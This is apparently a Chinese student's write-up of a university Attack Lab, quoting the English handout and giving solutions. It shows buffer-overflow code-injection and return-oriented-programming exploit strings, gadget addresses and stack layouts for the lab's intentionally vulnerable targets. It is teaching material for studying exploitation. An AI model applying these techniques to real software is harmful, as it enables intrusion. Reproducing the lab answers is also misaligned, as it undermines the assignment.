# 说明文档
Note：这次的说明文档很长，下面先放上原文档，放题目前会对要求做一总结，可跳过说明文档直接看题
## Introduction
>This assignment involves generating a total of five attacks on two programs having different security vulnerabilities.
Outcomes you will gain from this lab include:
• You will learn different ways that attackers can exploit security vulnerabilities when programs do not safeguard themselves well enough against buffer overflows.
• Through this, you will get a better understanding of how to write programs that are more secure, as well as some of the features provided by compilers and operating systems to make programs less
vulnerable.
• You will gain a deeper understanding of the stack and parameter-passing mechanisms of x86-64 machine code.
• You will gain a deeper understanding of how x86-64 instructions are encoded.
• You will gain more experience with debugging tools such as GDB and OBJDUMP.
==Note==: In this lab, you will gain firsthand experience with methods used to exploit security weaknesses in operating systems and network servers. Our purpose is to help you learn about the runtime operation of programs and to understand the nature of these security weaknesses so that you can avoid them when you write system code. We do not condone the use of any other form of attack to gain unauthorized access to any system resources.

## Get Your File
1. You can obtain your files by pointing your Web browser at:
http://ipads.se.sjtu.edu.cn:15513/
The server will build your files and return them to your browser in a tar file called ```targetk.tar```, where ```k```is the unique number of your target programs.
==Note==: It takes a few seconds to build and download your target, so please be patient.
Save the ```targetk.tar```file in a (protected) Linux directory in which you plan to do your work. Then give the command: ```tar -xvf targetk.tar```. This will extract a directory targetk containing the files described below.
2. The files in targetk include:
	* README.txt: A file describing the contents of the directory
	* ctarget: An executable program vulnerable to code-injection attacks
	* rtarget: An executable program vulnerable to return-oriented-programming attacks
	* cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.
	* farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented
programming attacks.
	* hex2raw: A utility to generate attack strings.
3. In the following instructions, we will assume that you have copied the files to a protected local directory, and that you are executing the programs in that local directory.

##  Important Points
Here is a summary of some important rules regarding valid solutions for this lab. These points will not make much sense when you read this document for the first time. They are presented here as a central reference of rules once you get started.
* You must do the assignment on a machine that is similar to the one that generated your targets.
* Your solutions may not use attacks to circumvent the validation code in the programs. Specifically,
any address you incorporate into an attack string for use by a ```ret ```instruction should be to one of the following destinations:
	* The addresses for functions touch1, touch2, or touch3.
	* The address of your injected code
	* The address of one of your gadgets from the gadget farm.
* You may only construct gadgets from file rtarget with addresses ranging between those for functions ```start_farm```and ```end_farm```.

## Target Programs
Both ```CTARGET```and ```RTARGET```read strings from standard input. They do so with the function ```getbuf```defined below:
```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```
The function Gets is similar to the standard library function gets—it reads a string from standard input (terminated by ‘```\n```’ or end-of-file```EOF```) and stores it (along with a null terminator) at the specified destination.
In this code, you can see that the destination is an array buf, declared as having ```BUFFER_SIZE```bytes. At the time your targets were generated, ```BUFFER_SIZE```was a compile-time constant specific to your version
of the programs.
Functions ```Gets()```and ```gets()```have no way to determine whether their destination buffers are large enough to store the string they read. They simply copy sequences of bytes, possibly overrunning the bounds
of the storage allocated at the destinations.
If the string typed by the user and read by getbuf is sufficiently short, it is clear that getbuf will return 1, as shown by the following execution examples:
```c
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```
Typically an error occurs if you type a long string:
```c
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time
```
(Note that the value of the cookie shown will differ from yours.) 
Program ```RTARGET```will have the same behavior. As the error message indicates, overrunning the buffer typically causes the program state to be corrupted, leading to a memory access error. Your task is to be more clever with the strings you feed ```CTARGET```and ```RTARGET```so that they do more interesting things. These are called exploit strings.
Both ```CTARGET```and ```RTARGET```take several different command line arguments:
* ```-h```: Print list of possible command line arguments
* ```-q```: Don’t send results to the grading server
* ```-i FILE```: Supply input from a file, rather than from standard input

Your exploit strings will typically contain byte values that do not correspond to the ASCII values for printing characters. The program ```HEX2RAW```will enable you to generate these raw strings. See ==Appendix A== for more information on how to use ```HEX2RAW```.
Important points:
* Your exploit string must not contain byte value 0x0a at any intermediate position, since this is the ASCII code for newline (‘```\n```’). When Gets encounters this byte, it will assume you intended to terminate the string.
* ```HEX2RAW```expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word ```0xdeadbeef```you should pass “```ef be ad de```” to ```HEX2RAW```(note the reversal required for little-endian byte ordering).

When you have correctly solved one of the levels, your target program will automatically send a notification to the grading server. For example:
```c
unix> ./hex2raw < ctarget.l2.txt | ./ctarget
Cookie: 0x1a7dd803
Type string:Touch2!: You called touch2(0x1a7dd803)
Valid solution for level 2 with target ctarget
PASSED: Sent exploit string to server to be validated.
NICE JOB!
```
![Figure 1: Summary of attack lab phases](https://img-blog.csdnimg.cn/20181121125359433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjkwMDQz,size_16,color_FFFFFF,t_70)

#  Part I: Code Injection Attacks
这类题目的程序中，栈的位置在每次运行时都是固定的，所以可以将栈中的数据看做可执行代码。这样的特性使得程序中的漏洞很容易被利用并加以攻击，而我们要做的事情就是利用其中的漏洞让程序执行我们想要执行的代码。

基本步骤是：
* 找到函数返回值所在地址，将我们想要跳转的地址放在这里，有的时候跳转的目标函数需要参数，需要先设置好。
* 之后将我们的攻击代码以两位十六进制数的形式写成字符串，用```HEX2RAW```工具转化成该ASCII码对应的字符（因为有的字符是不可打印字符，难以直接输入）。这个工具的使用方式在附录A中有详细的说明，我习惯用管子的方式，将攻击代码放在```exploit.txt```中，然后命令行中输入：
	```c
	unix> cat exploit.txt | ./hex2raw | ./ctarget
	```

##  Level 1
有一个```test```函数，代码如下：
```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
正常情况下调用```getbuf()```之后会运行```printf```输出语句，但是要求你在不自己写新的代码的情况下，不让它运行这一行代码，而是跳转到```touch1()```函数。当然不用担心程序在这之后会不会出问题，因为```touch1()```运行之后会正确终止程序，代码如下：
```c
void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```
可以看出这个函数并不需要参数，所以我们只需要把```getbuf()```存放返回值的内存数据修改为```touch1()```的地址即可，看一看汇编：
```c
0000000000401701 <getbuf>:
  401701:	48 83 ec 18          	sub    $0x18,%rsp
  401705:	48 89 e7             	mov    %rsp,%rdi
  401708:	e8 44 02 00 00       	callq  401951 <Gets>
  40170d:	b8 01 00 00 00       	mov    $0x1,%eax
  401712:	48 83 c4 18          	add    $0x18,%rsp
  401716:	c3                   	retq
0000000000401717 <touch1>:
  ···
```
显然合法数组大小为24，25-32为返回地址，改为```1717400000000000```即可（注意小端法）
```exploit.txt```中输入以下代码，前三行无意义，单纯占位
```c
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
30 30 30 30 30 30 30 30
17 17 40 00 00 00 00 00
```

## Level 2
还是那个```test```函数，这次让它跳转到```touch2()```函数，不同的是这个函数需要一个参数，根据代码可以看出参数应该是你的cookie
```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */
	if (val == cookie) 
	{
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} 
	else 
	{
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```
看汇编找到```touch2()```的地址```0000000000401745 <touch2>```，分析得到栈的结构如下：
栈 |
------ |
（原来返回值所在的位置）存放下面mov操作的地址 | 
ret |
push $0x401745 |
mov $0x18c55c46 , %rdi |
按照附录B的方法可以找到需要指令对应的机器编码：
首先把指令写在```example.s```中，然后命令行输入：
```c
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```
在```example.d```文件中即可找到对应的机器编码，按顺序输入，不够的用```30```或者随便什么占位就行（除了```\n```）

## Level 3
将```test()```函数跳转到```touch3()```，源代码如下：
```c
 /* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) 
	{
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} 	
	else 
	{
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```
也就是说要把cookie的地址作为指针参数放在```%rdi```里面，看汇编找到```touch3()```的地址```0000000000401820 <touch3>```，分析栈的结构如下：
栈 |
--- |
cookie |
（原来返回值所在的位置）存放下面mov操作的地址 |
ret |
push $0x401820 |
mov cookie的地址, %rdi |
找到机器编码按顺序输入，不够用占位符即可。
==注意==：cookie要转换成ASCII```31 38 63 35 35 63 34 36```

# Part II: Return-Oriented Programming
这种程序每次运行都会随机生成栈的地址，而且还会有哨兵检查越界，所以攻击难度增大。但是我们可以利用源文件中的一些编码片段拼凑成我们需要的指令，进行攻击，要求只能使用在```start_farm```和```end_farm```之间的片段。

## Level 2
跟上面level2要求一样，只是不能自己写代码，要用现成的，分析汇编中有的代码可以考虑用以下栈的结构：
栈 | 数据
--- | ---
touch2的地址 | 45 17 40 00 00 00 00 00
48 89 c7 c3 mov %rax, %rdi的首地址 | de 18 40 00 00 00 00 00
cookie | 46 5c c5 18 36 00 00 00 00
58 c3 pop %rax的首地址（原返回值的地方） | e7 18 40 00 00 00 00 00
占位符3 | 30 30 30 30 30 30 30 30
占位符2 | 30 30 30 30 30 30 30 30
占位符1 | 30 30 30 30 30 30 30 30
输入的时候从下往上输入
![figure3](https://img-blog.csdnimg.cn/20181121165030254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjkwMDQz,size_16,color_FFFFFF,t_70)

## Level 3
跟上面level3要求一样，只是由于不能自己写代码，所以就要用已有的代码经过计算得到一个地址，然后把cookie放在对应的地址里面，其中的计算比较复杂，分析汇编之后找到以下解决方案：
栈 | 数据
--- | ---
cookie | 31 38 63 35 35 63 34 36
touch3的地址| 20 18 40 00 00 00 00 00
48 89 c7 c3 mov %rax, %rdi的首地址 | de 18 40 00 00 00 00 00
48 8d 04 37 lea(%rdi,%rsi,1), %rax的首地址 | f0 18 40 00 00 00 00 00
89 d6 mov %edx, %esi的首地址（后两位的test没有用） | 2c 19 40 00 00 00 00 00
89 ca mov %ecx, %edx的首地址（0x90是nop，没有用） | 9d 19 40 00 00 00 00 00
89 c1 mov %eax, %ecx的首地址 | 43 19 40 00 00 00 00 00
偏移量 0x48| 48 00 00 00 00 00 00 00
58 c3 pop %rax的首地址| e7 18 40 00 00 00 00 00
48 89 c7 c3 mov %rax, %rdi的首地址| de 18 40 00 00 00 00 00
48 89 e0 c3 mov %rsp, %rax的首地址| 33 19 40 00 00 00 00 00
占位符3 | 30 30 30 30 30 30 30 30
占位符2 | 30 30 30 30 30 30 30 30
占位符1 | 30 30 30 30 30 30 30 30
输入的时候从下往上输入

==注意==：level 2和level 3都是利用```c3```也就是```ret```来实现跳转到```%rsp```所指的地址；输入数据较多时注意对齐，以免漏掉或者数错偏移量。

# 附录A Using HEX2RAW
```HEX2RAW```takes as input a hex-formatted string. In this format, each byte value is represented by two hex digits. For example, the string “012345” could be entered in hex format as “30 31 32 33 34 35 00.” (Recall that the ASCII code for decimal digit x is 0x3x, and that the end of a string is indicated by a null byte.)
The hex characters you pass to ```HEX2RAW```should be separated by whitespace (blanks or newlines). We recommend separating different parts of your exploit string with newlines while you’re working on it. ```HEX2RAW```supports C-style block comments, so you can mark off sections of your exploit string. For example:
```c
48 c7 c1 f0 11 40 00 /* mov $0x40011f0,%rcx */
```
Be sure to leave space around both the starting and ending comment strings (“/*”, “*/”), so that the comments will be properly ignored.
If you generate a hex-formatted exploit string in the file ```exploit.txt```, you can apply the raw string to ```CTARGET```or ```RTARGET```in several different ways:
1. You can set up a series of pipes to pass the string through ```HEX2RAW```.
	```c
	unix> cat exploit.txt | ./hex2raw | ./ctarget
	```
2. You can store the raw string in a file and use I/O redirection:
	```c
	unix> ./hex2raw < exploit.txt > exploit-raw.txt
	unix> ./ctarget < exploit-raw.txt
	```
	This approach can also be used when running from within GDB:
	```c
	unix> gdb ctarget
	(gdb) run < exploit-raw.txt
	```
3. You can store the raw string in a file and provide the file name as a command-line argument:
	```c
	unix> ./hex2raw < exploit.txt > exploit-raw.txt
	unix> ./ctarget -i exploit-raw.txt
	```
	This approach also can be used when running from within GDB.

# 附录B Generating Byte Codes
Using ```GCC```as an assembler and ```OBJDUMP```as a disassembler makes it convenient to generate the byte codes for instruction sequences. For example, suppose you write a file example.s containing the following assembly code:
```c
# Example of hand-generated assembly code
pushq $0xabcdef # Push value onto stack
addq $17,%rax # Add 17 to %rax
movl %eax,%edx # Copy lower 32 bits to %edx
```
The code can contain a mixture of instructions and data. Anything to the right of a ‘#’ character is a comment. You can now assemble and disassemble this file:
```c
unix> gcc -c example.s
unix> objdump -d example.o > example.d
```
The generated file example.d contains the following:
```c
example.o: file format elf64-x86-64
Disassembly of section .text:
0000000000000000 <.text>:
0: 68 ef cd ab 00 pushq $0xabcdef
5: 48 83 c0 11 add $0x11,%rax
9: 89 c2 mov %eax,%edx
```
The lines at the bottom show the machine code generated from the assembly language instructions. Each line has a hexadecimal number on the left indicating the instruction’s starting address (starting with 0), while the hex digits after the ‘```:```’ character indicate the byte codes for the instruction. Thus, we can see that the instruction ```push $0xABCDEF ```has hex-formatted byte code ```68 ef cd ab 00```.
From this file, you can get the byte sequence for the code:
```c
68 ef cd ab 00 48 83 c0 11 89 c2
```
This string can then be passed through ```HEX2RAW```to generate an input string for the target programs.. Alternatively, you can edit ```example.d```to omit extraneous values and to contain C-style comments for readability,
yielding:
```c
68 ef cd ab 00 /* pushq $0xabcdef */
48 83 c0 11 /* add $0x11,%rax */
89 c2 /* mov %eax,%edx */
```
This is also a valid input you can pass through ```HEX2RAW```before sending to one of the target programs.

# References
* R. Roemer, E. Buchanan, H. Shacham, and S. Savage. Return-oriented programming: Systems, languages, and applications. ACM Transactions on Information System Security, 15(1):2:1–2:34, March 2012.
* E. J. Schwartz, T. Avgerinos, and D. Brumley. Q: Exploit hardening made easy. In USENIX Security Symposium, 2011.
